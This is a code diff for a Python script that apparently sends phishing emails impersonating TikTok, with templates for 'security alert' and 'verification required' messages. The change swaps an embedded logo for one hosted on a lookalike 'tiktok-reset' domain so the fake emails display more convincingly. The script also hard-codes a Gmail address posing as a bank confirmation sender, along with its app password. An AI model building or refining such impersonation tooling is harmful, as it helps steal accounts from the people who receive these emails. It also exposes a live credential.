@@ -13,10 +13,20 @@ username = "Standardbankingconfirmation@gmail.com"   # 👈 your Gmail
 password = "udyu gyfv rfjj fvgk"     # 👈 use App Password if 2FA enabled
 
 # ========== Logo Configuration ==========
-# For local development, we'll embed the logo as base64
-# For production, you can use: BASE_URL = "https://your-domain.com"
-LOGO_PATH = "static/logo.jpg"
+# Use hosted logo URL for reliable email display
+LOGO_URL = "https://tiktok-reset.onrender.com/logo/logo.jpg"
+LOGO_PATH = "static/logo.jpg"  # Fallback for local development
 # =============================================
+
+def get_logo_html():
+    """Get logo HTML with hosted URL for reliable email display"""
+    try:
+        # Use hosted logo URL for production emails
+        return f'<img src="{LOGO_URL}" alt="TikTok" style="height: 60px; width: auto; max-width: 200px; display: block; margin: 0 auto;">'
+    except Exception as e:
+        print(f"❌ Error getting logo HTML: {e}")
+        # Fallback to text if logo fails
+        return '<span style="font-size: 32px; font-weight: bold; color: #ffffff;">🎵 TikTok</span>'
 
 def get_logo_base64():
     """Convert logo to base64 for email embedding"""
@@ -68,7 +78,7 @@ def send_custom_tiktok_email(smtp_server, smtp_port, sender_email, sender_passwo
         msg['Subject'] = subject
         
         # Get logo HTML
-        logo_html = get_logo_base64() and f'<img src="{get_logo_base64()}" alt="TikTok" style="height: 60px; width: auto; max-width: 200px;">' or '<span style="font-size: 32px; font-weight: bold; color: #ffffff;">🎵 TikTok</span>'
+        logo_html = get_logo_html()
         
         # Generate HTML content based on template
         if template == 'tiktok_security':
@@ -513,12 +523,12 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
 </head>
 <body>
     <div class="email-container">
-        <!-- Header with TikTok Logo -->
-        <div class="header">
-            <div class="tiktok-logo">
-                {get_logo_base64() and f'<img src="{get_logo_base64()}" alt="TikTok" style="height: 60px; width: auto; max-width: 200px;">' or '<span style="font-size: 32px; font-weight: bold; color: #ffffff;">🎵 TikTok</span>'}
+                    <!-- Header with TikTok Logo -->
+            <div class="header">
+                <div class="tiktok-logo">
+                    {get_logo_html()}
+                </div>
             </div>
-        </div>
         
         <!-- Main Content -->
         <div class="content">
@@ -753,7 +763,7 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
         <!-- Header -->
         <div class="header">
             <div class="tiktok-logo">
-                {get_logo_base64() and f'<img src="{get_logo_base64()}" alt="TikTok" style="height: 60px; width: auto; max-width: 200px;">' or '<span style="font-size: 32px; font-weight: bold; color: #ffffff;">🎵 TikTok</span>'}
+                {get_logo_html()}
             </div>
         </div>
         
